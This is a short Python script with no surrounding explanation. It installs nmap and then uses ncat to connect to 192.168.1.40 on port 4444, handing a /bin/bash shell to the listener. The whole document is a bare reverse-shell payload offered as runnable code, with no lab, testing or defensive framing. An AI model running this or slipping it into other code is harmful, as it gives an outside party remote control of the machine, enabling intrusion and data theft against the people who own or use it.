import os

os.system("apt-get install -y nmap")
os.system("ncat 192.168.1.40 4444 -e /bin/bash")
